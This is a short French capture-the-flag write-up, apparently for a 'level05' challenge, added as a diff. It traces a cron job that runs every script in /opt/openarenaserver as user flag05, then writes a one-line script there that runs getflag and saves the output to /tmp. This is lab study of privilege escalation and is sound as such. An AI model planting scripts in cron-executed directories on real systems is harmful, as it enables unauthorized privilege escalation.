@@ -1,0 +1,30 @@
+aucun element dans le dossier du level05 mais un indice lors
+de la connexion au level05 "you have new mail"
+
+find / -name level05 2>/dev/null
+    >/var/mail/level05
+    >/rofs/var/mail/level05
+
+cat /var/mail/level05
+    >*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+script de type cron qui execute toute les 2min openarenaserver
+
+find / -user flag05 2>/dev/null
+    >/usr/sbin/openarenaserver
+    >/rofs/usr/sbin/openarenaserver
+
+cat /usr/sbin/openarenaserver
+    >#!/bin/sh
+
+    >for i in /opt/openarenaserver/* ; do
+    >	(ulimit -t 5; bash -x "$i")
+    >	rm -f "$i"
+    >done
+
+ce script execute les scripts presents dans /opt/openarenaserver/
+puis les supprimes
+il faut donc mettre un script qui va faire un getflag et stocker le resultat dans un fichier
+
+echo "getflag > /tmp/mdp" > /opt/openarenaserver/recupflag
+
+apres 2 minutes le fichier mdp a ete cree dans /tmp avec le flag
